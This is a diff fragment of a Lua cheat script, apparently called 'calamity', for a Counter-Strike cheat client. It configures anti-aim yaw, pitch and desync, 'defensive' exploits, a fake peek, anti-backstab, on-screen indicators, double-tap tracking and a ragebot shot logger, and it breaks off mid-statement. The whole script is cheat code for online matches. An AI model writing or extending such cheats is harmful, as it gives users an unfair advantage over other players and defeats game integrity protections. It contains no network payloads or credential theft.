+    cmd.force_defensive = builder_items.force_def:get() or builder_items.peek_def:get() and to_defensive
+
+    local desync_type = entity.get_prop(lp, 'm_flPoseParameter', 11) * 120 - 60
+    local desync_side = desync_type > 0
+
+    ui.set(ref.yaw[1], '180')
+    ui.set(ref.pitch[1], antiaim_system[id].pitch:get())
+    ui.set(ref.yawbase, lua_menu.antiaim.yaw_base:get())
+    if builder_items.yaw_delay:get() > 1 and builder_items.body_yaw_type:get() == 'Jitter' then
+        ui.set(ref.bodyyaw[1], "Static")
+        ui.set(ref.bodyyaw[2], to_jitter and 1 or -1)
+        ui.set(ref.yawjitter[1], 'Off')
+        ui.set(ref.yawjitter[2], 0)
+        local yaw_l = antiaim_system[id].yaw_override:get() and randomize_value(builder_items.yaw_right:get(), builder_items.yaw_random:get()) or antiaim_system[id].yaw_offset:get()
+        local yaw_r = antiaim_system[id].yaw_override:get() and randomize_value(builder_items.yaw_left:get(), builder_items.yaw_random:get()) or antiaim_system[id].yaw_offset:get()
+        jit_amount = randomize_value(builder_items.mod_dm:get(), builder_items.mod_random:get())
+
+        if builder_items.mod_type:get() == 'Center' then
+            yaw_amount = to_jitter and (yaw_l + jit_amount/2) or (yaw_r - jit_amount/2)
+        elseif builder_items.mod_type:get() == 'Offset' then
+            yaw_amount = to_jitter and (yaw_l) or (yaw_r - jit_amount/2)
+        elseif builder_items.mod_type:get() == 'Random' then
+            yaw_amount = to_jitter and (yaw_l + jit_amount/2) or (yaw_r - jit_amount/2)
+        elseif builder_items.mod_type:get() == 'Skitter' then
+            if globals.tickcount() % 3 == 0 then 
+                yaw_amount = to_jitter and (yaw_l + jit_amount/2) or (yaw_r)
+            elseif globals.tickcount() % 3 == 1 then 
+                yaw_amount = to_jitter and (yaw_l) or (yaw_r)
+            else
+                yaw_amount = to_jitter and (yaw_l) or (yaw_r - jit_amount/2)
+            end
+        else
+            yaw_amount = to_jitter and yaw_l or yaw_r
+        end
+        not_def_yaw = yaw_amount
+    else
+        ui.set(ref.bodyyaw[1], builder_items.body_yaw_type:get())
+        ui.set(ref.bodyyaw[2], builder_items.body_yaw_type:get() == 'Jitter' and 1 or builder_items.body_slider:get())
+        ui.set(ref.yawjitter[1], builder_items.mod_type:get())
+        ui.set(ref.yawjitter[2], math.clamp(randomize_value(builder_items.mod_dm:get(), builder_items.mod_random:get()), -180, 180))
+        if antiaim_system[id].yaw_override:get() then
+            yaw_amount = desync_side and randomize_value(builder_items.yaw_left:get(), builder_items.yaw_random:get()) or randomize_value(builder_items.yaw_right:get(), builder_items.yaw_random:get())
+        else
+            yaw_amount = antiaim_system[id].yaw_offset:get()
+        end
+        not_def_yaw = yaw_amount
+    end
+
+    if is_defensive_active(lp) and builder_items.defensive:get() and not is_static then
+        ui.set(ref.pitch[1], 'Custom')
+
+        if antiaim_system[id].defensive_select:get('Jitter') then
+            ui.set(ref.yawjitter[1], builder_items.def_mod_type:get())
+            ui.set(ref.yawjitter[2], math.clamp(randomize_value(builder_items.def_mod_dm:get(), builder_items.def_mod_random:get()), -180, 180))
+        end
+
+        if antiaim_system[id].defensive_select:get('Body Yaw') then
+            ui.set(ref.bodyyaw[1], builder_items.def_body_yaw_type:get()) 
+            ui.set(ref.bodyyaw[2], builder_items.def_body_yaw_type:get() == 'Jitter' and 1 or builder_items.def_body_slider:get())
+        end
+
+        if builder_items.defensive_yaw:get() == "Spin" then
+            yaw_amount = custom_spin(builder_items.spin_speed:get(), builder_items.spin_offset:get())
+        elseif builder_items.defensive_yaw:get() == "Side~Ways" then
+            yaw_amount = globals.tickcount() % 4 > 1 and builder_items.yaw_value:get()+not_def_yaw or -(builder_items.yaw_value:get()-not_def_yaw)
+        elseif builder_items.defensive_yaw:get() == "Random" then
+            yaw_amount = math.random(-builder_items.yaw_value:get(), builder_items.yaw_value:get())
+        elseif builder_items.defensive_yaw:get() == "Offset" then
+            yaw_amount = yaw_direction == 0 and builder_items.yaw_value:get() or yaw_direction
+        elseif builder_items.defensive_yaw:get() == "Flick" then
+            yaw_amount = globals.tickcount() % 1 > 2 and builder_items.yaw_value:get()+not_def_yaw or -(builder_items.yaw_value:get()-not_def_yaw)
+
+        end
+        if builder_items.defensive_pitch:get() == "Custom" then
+            ui.set(ref.pitch[2], builder_items.pitch_value:get())
+        elseif builder_items.defensive_pitch:get() == "Side~Ways" then
+            ui.set(ref.pitch[2], globals.tickcount() % 4 > 1 and 49 or -49)
+        elseif builder_items.defensive_pitch:get() == "Random" then
+            ui.set(ref.pitch[2], math.random(-89, 89))
+        elseif builder_items.defensive_pitch:get() == "Spin" then
+            ui.set(ref.pitch[2], math.clamp(custom_spin(builder_items.pitch_speed:get(), builder_items.pitch_value:get()), -89, 89))
+        else
+            ui.set(ref.pitch[2], 89)
+        end
+    end
+
+    ui.set(ref.yaw[2], yaw_direction == 0 and math.clamp(yaw_amount, -180, 180) or yaw_direction)
+
+    if is_static then
+        ui.set(ref.yaw[2], yaw_direction == 0 and 0 or yaw_direction)
+        ui.set(ref.yawjitter[1], 'Off')
+        ui.set(ref.yawjitter[2], 0)
+        ui.set(ref.bodyyaw[1], 'Static')
+        ui.set(ref.bodyyaw[2], 1)
+    end
+
+    local players = entity.get_players(true)
+    if lua_menu.antiaim.aa_override:get('On Warmup') then
+        if entity.get_prop(entity.get_game_rules(), "m_bWarmupPeriod") == 1 then
+            ui.set(ref.yaw[2], globals.tickcount() % 36 * 10 - 180)
+            ui.set(ref.yawjitter[2], 0)
+            ui.set(ref.bodyyaw[1], 'Static')
+            ui.set(ref.bodyyaw[2], 0)
+            ui.set(ref.pitch[1], "Custom")
+            ui.set(ref.pitch[2], 0) 
+            cmd.force_defensive = false
+        end
+    end
+
+    for i=1, 64 do
+        if entity.is_alive(i) and entity.is_enemy(i) then
+            table.insert(alive_players, i)
+        end
+    end
+
+    if lua_menu.antiaim.aa_override:get('No Enemies Alive') then
+        if client.current_threat() == nil and #alive_players == 0 then
+            ui.set(ref.yaw[2], globals.tickcount() % 36 * 10 - 180)
+            ui.set(ref.yawjitter[2], 0)
+            ui.set(ref.bodyyaw[1], 'Static')
+            ui.set(ref.bodyyaw[2], 0)
+            ui.set(ref.pitch[1], "Custom")
+            ui.set(ref.pitch[2], 0) 
+            cmd.force_defensive = false
+        end
+    end
+
+    alive_players = {}
+
+    if id == 10 then
+        ui.set(ref.yawbase, 'Local View')
+        ui.set(ref.pitch[1], "Off")
+        ui.set(ref.yaw[1], 'Off')
+    end
+
+    local threat = client.current_threat()
+    local lp_weapon = entity.get_player_weapon(lp)
+    local lp_orig_x, lp_orig_y, lp_orig_z = entity.get_prop(lp, "m_vecOrigin")
+    local flags = entity.get_prop(lp, 'm_fFlags')
+    local jumpcheck = bit.band(flags, 1) == 0 or cmd.in_jump == 1
+    local ducked = entity.get_prop(lp, 'm_flDuckAmount') > 0.7
+
+
+    if lp_weapon ~= nil then
+        if lua_menu.antiaim.safe_head:get("Air+C Knife") then
+            if jumpcheck and ducked and entity.get_classname(lp_weapon) == "CKnife" then
+                safe_head = true
+            end
+        end
+        if lua_menu.antiaim.safe_head:get("Air+C Zeus") then
+            if jumpcheck and ducked and entity.get_classname(lp_weapon) == "CWeaponTaser" then
+                safe_head = true
+            end
+        end
+        if lua_menu.antiaim.safe_head:get("Height Difference") then
+            if threat ~= nil and is_vulnerable() then
+                threat_x, threat_y, threat_z = entity.get_prop(threat, "m_vecOrigin")
+                threat_dist = lp_orig_z - threat_z
+                if threat_dist > lua_menu.antiaim.height_difference:get() then
+                    safe_head = true
+                end
+            end
+        end
+        
+        if lua_menu.antiaim.safe_head:get("Air+C SMG") then
+            if jumpcheck and ducked and (entity.get_classname(lp_weapon) == "CWeaponMAC10" or entity.get_classname(lp_weapon) == "CWeaponMP9" or entity.get_classname(lp_weapon) == "CWeaponMP7" or entity.get_classname(lp_weapon) == "CWeaponUMP45" or entity.get_classname(lp_weapon) == "CWeaponBizon" or entity.get_classname(lp_weapon) == "CWeaponP90") then
+                safe_head = true
+            end
+        end
+    end
+
+    if lua_menu.antiaim.yaw_options:get('Fake Peek') and yaw_direction ~= 0 then
+        cmd.force_defensive = true
+        if is_defensive_active(lp) then
+            ui.set(ref.yaw[1], '180')
+            ui.set(ref.yaw[2], -yaw_direction)
+            ui.set(ref.pitch[2], math.random(-10, 10))
+        end
+    end
+
+    if is_freestand and lua_menu.antiaim.fr_options:get('Fake Peek') and yaw_direction == 0 then
+        if is_vulnerable() then
+            cmd.force_defensive = true
+            if not is_defensive_active(lp) then
+                last_yaw = entity.get_prop(lp, 'm_flLowerBodyYawTarget')
+            else    
+                cmd.pitch = (math.random(-10, 10))
+                if last_yaw > 0 then
+                    cmd.yaw = normalize_yaw(last_yaw - 180)
+                else
+                    cmd.yaw = normalize_yaw(last_yaw + 180)
+                end
+            end
+        end
+    end
+
+    if lua_menu.misc.antibackstab:get() then
+        for i=1, #players do
+            if players == nil then return end
+            enemy_orig_x, enemy_orig_y, enemy_orig_z = entity.get_prop(players[i], "m_vecOrigin")
+            distance_to = anti_knife_dist(lp_orig_x, lp_orig_y, lp_orig_z, enemy_orig_x, enemy_orig_y, enemy_orig_z)
+            weapon = entity.get_player_weapon(players[i])
+            if weapon == nil then return end
+            if entity.get_classname(weapon) == "CKnife" and distance_to <= 250 then
+                ui.set(ref.yaw[2], 180)
+                ui.set(ref.yawbase, "At targets")
+            end
+        end
+    end
+
+
+    --Force Defensive Triggers
+
+    local is_stand = lua_menu.antiaim.defensive_condition:get('Stand') and player_state(cmd) == 'Stand'
+    local is_moving = lua_menu.antiaim.defensive_condition:get('Stand') and player_state(cmd) == 'Moving'
+    local is_walking = lua_menu.antiaim.defensive_condition:get('Walking') and player_state(cmd) == 'Walking'
+    local is_crouching = lua_menu.antiaim.defensive_condition:get('Crouching') and (player_state(cmd) == 'Duck' or player_state(cmd) == 'Duck-Moving')
+    local is_air = lua_menu.antiaim.defensive_condition:get('Air') and (player_state(cmd) == 'Air' or player_state(cmd) == 'Air+C')
+
+    if is_stand or is_moving or is_walking or is_crouching or is_air then
+        if lua_menu.antiaim.defensive_triggers:get('Hittable') and is_vulnerable() then
+            cmd.force_defensive = true
+        end
+        if lua_menu.antiaim.defensive_triggers:get('Reload') and entity.get_esp_data(lp).flags == 32 then
+            cmd.force_defensive = true
+        end
+    end
+end
+
+local screen = {client.screen_size()}
+local center = {screen[1]/2, screen[2]/2} 
+
+math.lerp = function(name, value, speed)
+    return name + (value - name) * globals.absoluteframetime() * speed
+end
+
+local rgba_to_hex = function(b, c, d, e)
+    return string.format('%02x%02x%02x%02x', b, c, d, e)
+end
+
+function lerp(a, b, t)
+    return a + (b - a) * t
+end
+
+function clamp(x, minval, maxval)
+    if x < minval then
+        return minval
+    elseif x > maxval then
+        return maxval
+    else
+        return x
+    end
+end
+
+local function text_fade_animation(x, y, speed, color1, color2, text, flag)
+    local final_text = ''
+    local curtime = globals.curtime()
+
+    for i = 0, #text do
+        local x_offset = i * 10
+        local wave = math.cos(8 * speed * curtime + x_offset / 30)
+        local color = rgba_to_hex(
+            lerp(color1.r, color2.r, clamp(wave, 0, 1)),
+            lerp(color1.g, color2.g, clamp(wave, 0, 1)),
+            lerp(color1.b, color2.b, clamp(wave, 0, 1)),
+            color1.a
+        )
+        final_text = final_text .. '\a' .. color .. text:sub(i, i)
+    end
+
+    renderer.text(x, y, color1.r, color1.g, color1.b, color1.a, flag, nil, final_text)
+end
+
+local function fade_anim(speed, color1, color2, text)
+    local final_text = ''
+    local curtime = globals.curtime()
+
+    for i = 0, #text do
+        local x_offset = i * 10
+        local wave = math.cos(8 * speed * curtime + x_offset / 30)
+        local color = rgba_to_hex(
+            lerp(color1.r, color2.r, clamp(wave, 0, 1)),
+            lerp(color1.g, color2.g, clamp(wave, 0, 1)),
+            lerp(color1.b, color2.b, clamp(wave, 0, 1)),
+            color1.a
+        )
+        final_text = final_text .. '\a' .. color .. text:sub(i, i)
+    end
+    return final_text
+end
+
+local function doubletap_charged()
+    if not ui.get(ref.dt[1]) or not ui.get(ref.dt[2]) or ui.get(ref.fakeduck) then return false end
+    if not entity.is_alive(entity.get_local_player()) or entity.get_local_player() == nil then return end
+    local weapon = entity.get_prop(entity.get_local_player(), "m_hActiveWeapon")
+    if weapon == nil then return false end
+    local next_attack = entity.get_prop(entity.get_local_player(), "m_flNextAttack") + 0.01
+    local checkcheck = entity.get_prop(weapon, "m_flNextPrimaryAttack")
+    if checkcheck == nil then return end
+    local next_primary_attack = checkcheck + 0.01
+    if next_attack == nil or next_primary_attack == nil then return false end
+    return next_attack - globals.curtime() < 0 and next_primary_attack - globals.curtime() < 0
+end
+
+local scoped_space = 0
+
+local desync = 0
+
+breathe = function(offset, multiplier)
+    local m_speed = globals.realtime() * (multiplier or 1.0);
+    local m_factor = m_speed % math.pi;
+
+    local m_sin = math.sin(m_factor + (offset or 0));
+    local m_abs = math.abs(m_sin);
+
+    return m_abs
+end
+
+local function screen_indicator()
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+    local scpd = entity.get_prop(lp, "m_bIsScoped") == 1
+    scoped_space = math.lerp(scoped_space, scpd and 1 or 0, 20)
+    local condition = "GLOBAL"
+    if id == 1 then condition = "GLOBAL"
+    elseif id == 2 then condition = "STANDING"
+    elseif id == 3 then condition = "WALKING"
+    elseif id == 4 then condition = "RUNNING"
+    elseif id == 5 then condition = "AEROBIC"
+    elseif id == 6 then condition = "AEROBIC"
+    elseif id == 7 then condition = "DUCKING"
+    elseif id == 8 then condition = "DUCKING" end
+    local spaceind = 10
+    local vel_mod = entity.get_prop(lp, 'm_flVelocityModifier')
+    if vel_mod ~= 1 then
+        desync = math.lerp(desync, math.max(vel_mod, 0.3), 10)
+    else
+        desync = math.lerp(desync, math.max(math.abs(entity.get_prop(lp, 'm_flPoseParameter', 11) * 120 - 60)/60, 0.3), 10)
+    end
+
+    lua_menu.visuals.cross_color:override(true)
+    lua_menu.visuals.key_color:override(true)
+    local r1, g1, b1, a1 = lua_menu.visuals.cross_ind:get_color()
+    local r2, g2, b2, a2 = lua_menu.visuals.cross_color:get_color()
+    local r3, g3, b3, a3 = lua_menu.visuals.key_color:get_color()
+    local r, g, b, a = 255, 255, 255, 255
+
+    local lolx, loly = renderer.measure_text('c', '.lua')
+    local mainx, mainy = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'cb', lua_menu.visuals.cross_ind_type:get() == 'Default' and "C A L A M I T Y" or 'calamity')
+    local dtx, dty = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'b', lua_menu.visuals.cross_ind_type:get() == 'Default' and "DT" or 'dt')
+    local bodyx, bodyy = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'c', lua_menu.visuals.cross_ind_type:get() == 'Default' and "BODY" or 'body')
+    local osaax, osaay = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'c', lua_menu.visuals.cross_ind_type:get() == 'Default' and "OSAA" or 'osaa')
+    local fsx, fsy = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'c', lua_menu.visuals.cross_ind_type:get() == 'Default' and "FS" or 'fs')
+    local dmgx, dmgy = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'c', lua_menu.visuals.cross_ind_type:get() == 'Default' and "DMG" or 'dmg')
+    local statex, statey = renderer.measure_text(lua_menu.visuals.cross_ind_type:get() == 'Default' and "c-" or 'c', lua_menu.visuals.cross_ind_type:get() == 'Default' and condition or '·'..string.lower(condition)..'·')
+
+    if lua_menu.visuals.cross_ind_type:get() == 'Default' then
+
+        text_fade_animation(center[1] + math.floor(scoped_space * 50), center[2] + 30, -1, {r=r1, g=g1, b=b1, a=255}, {r=r2, g=g2, b=b2, a=255}, "C A L A M I T Y", "c-")
+
+        renderer.rectangle(center[1] + math.floor(scoped_space * 50) - mainx/2 + 1, center[2] + 35, mainx+1, 3, 0, 0, 0, 255)
+        renderer.rectangle(center[1] + math.floor(scoped_space * 50) - mainx/2 + 2, center[2] + 36, (mainx - 1)*desync, 1, 255, 255, 255, 255)
+        renderer.text(center[1] + math.floor((statex + 56)*0.5 * scoped_space), center[2] + 42, r2, g2, b2, 255, "c-", 0, string.upper(condition))
+
+        if ui.get(ref.forcebaim)then
+            renderer.text(center[1] + math.floor((dtx + 65)*0.5 * scoped_space), center[2] + 40 + (spaceind), 255, 102, 117, 255, "c-", 0, "BODY")
+            spaceind = spaceind + 9
+        end
+
+        if ui.get(ref.os[2]) then
+            renderer.text(center[1] + math.floor((osaax + 55)*0.5 * scoped_space), center[2] + 40 + (spaceind), r3, g3, b3, 255, "c-", 0, "OSAA")
+            spaceind = spaceind + 9
+        end
+
+        if ui.get(ref.minimum_damage_override[2]) then
+            renderer.text(center[1] + math.floor((dmgx + 56)*0.5 * scoped_space), center[2] + 40 + (spaceind), r3, g3, b3, 255, "c-", 0, "DMG")
+            spaceind = spaceind + 9
+        end
+
+        if ui.get(ref.dt[1]) and ui.get(ref.dt[2]) then
+            if doubletap_charged() then
+                renderer.text(center[1] + math.floor((dtx + 55)*0.5 * scoped_space), center[2] + 40 + (spaceind), r3, g3, b3, 255, "c-", 0, "DT")
+            else
+                renderer.text(center[1] + math.floor((dtx + 55)*0.5 * scoped_space), center[2] + 40 + (spaceind), 255, 0, 0, 255, "c-", 0, "DT")
+            end
+            spaceind = spaceind + 9
+        end
+
+        if ui.get(ref.freestand[1]) and ui.get(ref.freestand[2]) then
+            renderer.text(center[1] + math.floor((dtx + 55)*0.5 * scoped_space), center[2] + 40 + (spaceind), r3, g3, b3, 255, "c-", 0, "FS")
+            spaceind = spaceind + 9
+        end
+    else    
+        local breathe_alpha = breathe(0, 2.0) * 255
+        text_fade_animation(center[1] + math.floor(scoped_space * 52), center[2] + 30, -1, {r=r1, g=g1, b=b1, a=255}, {r=r2, g=g2, b=b2, a=255}, "calamity", "cb")
+
+        renderer.text(center[1] + math.floor((statex + 58)*0.5 * scoped_space), center[2] + 40, r2, g2, b2, 255, "c", 0, '·'..string.lower(condition)..'·')
+
+        if ui.get(ref.forcebaim)then
+            renderer.text(center[1] + math.floor((dtx + 72)*0.5 * scoped_space), center[2] + 42 + (spaceind), 255, 102, 117, 255, "c", 0, "body")
+            spaceind = spaceind + 10
+        end
+
+        if ui.get(ref.os[2]) then
+            renderer.text(center[1] + math.floor((osaax + 58)*0.5 * scoped_space), center[2] + 42 + (spaceind), r3, g3, b3, 255, "c", 0, "osaa")
+            spaceind = spaceind + 10
+        end
+
+        if ui.get(ref.minimum_damage_override[2]) then
+            renderer.text(center[1] + math.floor((dmgx + 58)*0.5 * scoped_space), center[2] + 42 + (spaceind), r3, g3, b3, 255, "c", 0, "dmg")
+            spaceind = spaceind + 10
+        end
+
+        if ui.get(ref.dt[1]) and ui.get(ref.dt[2]) then
+            if doubletap_charged() then
+                renderer.text(center[1] + math.floor((dtx + 60)*0.5 * scoped_space), center[2] + 42 + (spaceind), r3, g3, b3, 255, "c", 0, "dt")
+            else
+                renderer.text(center[1] + math.floor((dtx + 60)*0.5 * scoped_space), center[2] + 42 + (spaceind), 255, 0, 0, 255, "c", 0, "dt")
+            end
+            spaceind = spaceind + 10
+        end
+
+        if ui.get(ref.freestand[1]) and ui.get(ref.freestand[2]) then
+            renderer.text(center[1] + math.floor((dtx + 60)*0.5 * scoped_space), center[2] + 42 + (spaceind), r3, g3, b3, a, "c", 0, "fs")
+            spaceind = spaceind + 10
+        end
+    end
+end
+
+local defensive_alpha = 0
+local defensive_amount = 0
+local velocity_alpha = 0
+local velocity_amount = 0
+
+local function velocity_ind()
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+    local r, g, b, a = lua_menu.visuals.velocity_window:get_color()
+    local vel_mod = entity.get_prop(lp, 'm_flVelocityModifier')
+
+    if not ui.is_menu_open() then
+        velocity_alpha = math.lerp(velocity_alpha, vel_mod < 1 and 255 or 0, 5)
+        velocity_amount = math.lerp(velocity_amount, vel_mod, 5)
+    else
+        velocity_alpha = math.lerp(velocity_alpha, 255, 5)
+        velocity_amount = globals.tickcount() % 50/100 * 2
+    end
+
+    if velocity_alpha < 5 then return end
+
+    renderer.text(center[1], screen[2] / 3 - 15, 255, 255, 255, velocity_alpha, "c", 0, "- velocity -")
+
+    if lua_menu.visuals.velocity_window_type:get() == 'Default' then
+        renderer.rectangle(center[1]-50, screen[2] / 3, 100, 5, 0,0,0, velocity_alpha)
+        renderer.rectangle(center[1]-49, screen[2] / 3+1, (100*velocity_amount)-1, 3, r, g, b, velocity_alpha)
+    else
+        renderer.glow_module(center[1]-50 - math.floor(50*velocity_amount) + 50, screen[2] / 3, math.floor(100*velocity_amount), 3, 6, 3, {r, g, b, velocity_alpha/2}, {r, g, b, velocity_alpha})
+    end
+end
+
+local function defensive_ind()
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+    local charged = doubletap_charged()
+    local active = is_defensive_active(lp)
+    local r, g, b, a = lua_menu.visuals.defensive_window:get_color()
+    if not ui.is_menu_open() then
+        if ui.get(ref.dt[1]) and ui.get(ref.dt[2]) and not ui.get(ref.fakeduck) then
+            if charged and active then
+                defensive_alpha = math.lerp(defensive_alpha, 255, 5)
+                defensive_amount = math.lerp(defensive_amount, 1, 5)
+            elseif charged and not active then
+                defensive_alpha = math.lerp(defensive_alpha, 0, 5)
+                defensive_amount = math.lerp(defensive_amount, 0.5, 5)
+            else
+                defensive_alpha = math.lerp(defensive_alpha, 255, 5)
+                defensive_amount = math.lerp(defensive_amount, 0, 5)
+            end
+        else
+            defensive_alpha = math.lerp(defensive_alpha, 0, 5)
+            defensive_amount = math.lerp(defensive_amount, 0, 5)
+        end
+    else
+        defensive_alpha = math.lerp(defensive_alpha, 255, 10)
+        defensive_amount = globals.tickcount() % 50/100 * 2
+    end
+
+    if defensive_alpha < 5 then return end
+
+    renderer.text(center[1], screen[2] / 4 - 15, 255, 255, 255, defensive_alpha, "c", 0, "- defensive -")
+
+    if lua_menu.visuals.defensive_window_type:get() == 'Default' then
+        renderer.rectangle(center[1]-50, screen[2] / 4, 100, 5, 0,0,0, defensive_alpha)
+        renderer.rectangle(center[1]-49, screen[2] / 4+1, (100*defensive_amount)-1, 3, r, g, b, defensive_alpha)
+    else
+        renderer.glow_module(center[1]-50 - math.floor(50*defensive_amount) + 50, screen[2] / 4, math.floor(100*defensive_amount), 3, 6, 3, {r, g, b, defensive_alpha/2}, {r, g, b, defensive_alpha})
+    end
+end
+
+local function air_qs(cmd)
+    local lp = entity.get_local_player()
+    if not lp then return end
+    if not entity.is_alive(lp) then return end
+
+    local ticks = 0
+    local players = entity.get_players(true)
+    local lpvec = vector(entity.get_prop(lp, "m_vecOrigin"))
+    local weapon = entity.get_player_weapon(lp)
+    local class = entity.get_classname(weapon)
+
+    if class ~= "CWeaponSSG08" then return end
+    local vecvelocity = { entity.get_prop(lp, 'm_vecVelocity') }
+
+    local check_vel = vecvelocity[3] > 0
+    local flags = entity.get_prop(lp, 'm_fFlags')
+    local jumpcheck = bit.band(flags, 1) == 0
+
+    local enemy = client.current_threat()
+    if not enemy then return end
+    if not jumpcheck then return end
+    local enemyvec = vector(entity.get_origin(enemy))
+    local trace_l = vector(entity.get_origin(lp))
+    if not check_vel then return end
+    for i=1, #players do
+        if players == nil then return end
+        local x1, y1, z1 = entity.get_prop(players[i], "m_vecOrigin")
+
+        local dist = anti_knife_dist(lpvec.x, lpvec.y, lpvec.z, x1, y1, z1)
+        if dist <= 1500 then
+            if cmd.quick_stop then
+                if (globals.tickcount() - ticks) > 3 then
+                    cmd.in_speed = 1
+                end
+            else
+                ticks = globals.tickcount()
+            end
+        end
+    end
+end
+
+local prev_console = cvar.con_filter_text:get_string()
+
+local function console_filter(value)
+    cvar.con_filter_enable:set_int(value and 1 or 0)  
+    cvar.con_filter_text:set_int(value and 1 or 0)
+    cvar.con_filter_text_out:set_int(value and 1 or 0)
+    cvar.con_filter_text:set_string(value and "__" or prev_console)
+end
+
+console_filter(lua_menu.misc.console:get())
+
+lua_menu.misc.console:set_callback(function(self)
+    console_filter(self:get())
+end)
+
+local shot_logger = {}
+
+prefer_safe_point = ui.reference('RAGE', 'Aimbot', 'Prefer safe point')
+force_safe_point = ui.reference('RAGE', 'Aimbot', 'Force safe point')
+
+shot_logger.add = function(...)
+    args = { ... }
+    len = #args
+    for i = 1, len do
+        arg = args[i]
+        r, g, b = unpack(arg)
+
+        msg = {}
+
+        if #arg == 3 then
+            _G.table.insert(msg, " ")
+        else
+            for i = 4, #arg do
+                _G.table.insert(msg, arg[i])
+            end
+        end
+        msg = _G.table.concat(msg)
+
+        if len > i then
+            msg = msg .. "\0"
+        end
+
+        client.color_log(r, g, b, msg)
+
+
+    end
+end
+
+shot_logger.bullet_impacts = {}
+shot_logger.bullet_impact = function(e)
+    local tick, me, user = globals.tickcount(), entity.get_local_player(), client.userid_to_entindex(e.userid)
+    if user ~= me then return end
+    if #shot_logger.bullet_impacts > 150 then shot_logger.bullet_impacts = {} end
+    shot_logger.bullet_impacts[#shot_logger.bullet_impacts+1] = {tick = tick, eye = vector(client.eye_position()), shot = vector(e.x, e.y, e.z)}
+end
+
+shot_logger.get_inaccuracy_tick = function(pre_data, tick)
+    for _, impact in pairs(shot_logger.bullet_impacts) do
+        if impact.tick == tick then
+            local spread_angle = vector((pre_data.eye-pre_data.shot_pos):angles()-(pre_data.eye-impact.shot):angles()):length2d()
+            return spread_angle
+        end
+    end
+    return -1
+end
+
+shot_logger.get_safety = function(aim_data, target)
+    if not aim_data.boosted then return -1 end
+    local plist_safety, ui_safety = plist.get(target, 'Override safe point'), {ui.get(prefer_safe_point), ui.get(force_safe_point) or plist_safety == 'On'}
+    if plist_safety == 'Off' or not (ui_safety[1] or ui_safety[2]) then return 0 end
+    return ui_safety[2] and 2 or (ui_safety[1] and 1 or 0)
+end
+
+shot_logger.generate_flags = function(pre_data)
+    return {pre_data.self_choke > 1 and 1 or 0, pre_data.velocity_modifier < 1.00 and 1 or 0, pre_data.flags.boosted and 1 or 0}
+end
+
+
+shot_logger.hitboxes = {"generic", "head", "chest", "stomach", "left arm", "right arm", "left leg", "right leg", "neck", "?", "gear"}
+shot_logger.on_aim_fire = function(e)
+	local p_ent = e.target
+	local me = entity.get_local_player()
+
+	shot_logger[e.id] = {
+		original = e,
+		dropped_packets = { },
+
+		handle_time = globals.realtime(),
+		self_choke = globals.chokedcommands(),
+
+		flags = {
+			boosted = e.boosted
+		},
+
+		feet_yaw = entity.get_prop(p_ent, 'm_flPoseParameter', 11)*120-60,
+		correction = plist.get(p_ent, 'Correction active'),
+
+		safety = shot_logger.get_safety(e, p_ent),
+		shot_pos = vector(e.x, e.y, e.z),
+		eye = vector(client.eye_position()),
+		view = vector(client.camera_angles()),
+
+		velocity_modifier = entity.get_prop(me, 'm_flVelocityModifier'),
+		total_hits = entity.get_prop(me, 'm_totalHitsOnServer'),
+
+		history = globals.tickcount() - e.tick
+	}
+end
+shot_logger.on_aim_hit = function(e)
+	if not lua_menu.visuals.ragebot_logs:get('Console') then return end
+
+	if shot_logger[e.id] == nil then
+		return 
+	end
+
+	local info = 
+	{
+		type = math.max(0, entity.get_prop(e.target, 'm_iHealth')) > 0,
+		prefix = { lua_menu.visuals.ragebot_logs_hit:get() },
+		hit = { lua_menu.visuals.ragebot_logs_hit:get() },
+		name = entity.get_player_name(e.target),
+		hitgroup = shot_logger.hitboxes[e.hitgroup + 1] or '?',
+		flags = string.format('%s', _G.table.concat(shot_logger.generate_flags(shot_logger[e.id]))),
+		aimed_hitgroup = shot_logger.hitboxes[shot_logger[e.id].original.hitgroup + 1] or '?',
+		aimed_hitchance = string.format('%d%%', math.floor(shot_logger[e.id].original.hit_chance + 0.5)),
+		hp = math.max(0, entity.get_prop(e.target, 'm_iHealth')),
+		spread_angle = string.format('%.2f°', shot_logger.get_inaccuracy_tick(shot_logger[e.id], globals.tickcount())),
+		correction = string.format('%d:%d°', shot_logger[e.id].correction and 1 or 0, (shot_logger[e.id].feet_yaw < 10 and shot_logger[e.id].feet_yaw > -10) and 0 or shot_logger[e.id].feet_yaw)
+	}
+
+	shot_logger.add({ info.prefix[1], info.prefix[2], info.prefix[3], 'calamity'}, 
+					{ 134, 134, 134, ' » ' }, 
+					{ 200, 200, 200, info.type and 'damaged ' or 'killed ' }, 
+					{ info.hit[1], info.hit[2], info.hit[3],  info.name }, 
+					{ 200, 200, 200, ' in the ' }, 
+					{ info.hit[1], info.hit[2], info.hit[3], info.hitgroup }, 
+					{ 200, 200, 200, info.type and info.hitgroup ~= info.aimed_hitgroup and ' (' or ''},
+					{ info.hit[1], info.hit[2], info.hit[3], info.type and (info.hitgroup ~= info.aimed_hitgroup and info.aimed_hitgroup) or '' },
+					{ 200, 200, 200, info.type and info.hitgroup ~= info.aimed_hitgroup and ']' or ''},
+					{ 200, 200, 200, info.type and ' for ' or '' },
+					{ info.hit[1], info.hit[2], info.hit[3], info.type and e.damage or '' },
+					{ 200, 200, 200, info.type and e.damage ~= shot_logger[e.id].original.damage and ' (' or ''},
+					{ info.hit[1], info.hit[2], info.hit[3], info.type and (e.damage ~= shot_logger[e.id].original.damage and shot_logger[e.id].original.damage) or '' },
+					{ 200, 200, 200, info.type and e.damage ~= shot_logger[e.id].original.damage and ')' or ''},
+					{ 200, 200, 200, info.type and ' damage' or '' },
+					{ 200, 200, 200, info.type and ' (' or '' }, { info.hit[1], info.hit[2], info.hit[3], info.type and info.hp or '' }, { 200, 200, 200, info.type and ' hp remaning)' or '' },
